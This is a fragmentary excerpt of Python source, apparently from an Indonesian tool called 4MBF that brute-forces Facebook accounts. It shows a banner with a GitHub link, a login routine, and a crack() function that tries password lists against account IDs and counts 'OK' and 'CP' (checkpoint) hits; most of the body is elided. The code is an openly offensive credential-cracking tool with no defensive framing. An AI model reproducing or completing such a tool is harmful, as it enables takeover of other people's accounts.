...
•                                               •
  •   GITHUB : HTTPS://GITHUB.COM/Basari-ID/4MBF   •'''
...
def login_lagi334():
	try:
		...
		print('\nLOGIN BERHASIL NGAB ---> jalankan ulang ketik python baz.py ');time.sleep(1)
		exit()
	except Exception as e:
...
def crack(idf,pwv):
	...
	ses = requests.Session()
	sys.stdout.write('\r%s [<BAZ>] %s/%s ^_^ OK:%s ^_^ CP:%s ^_^ %s%s%s [<BAZ>]'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	for pw in pwv:
		try:
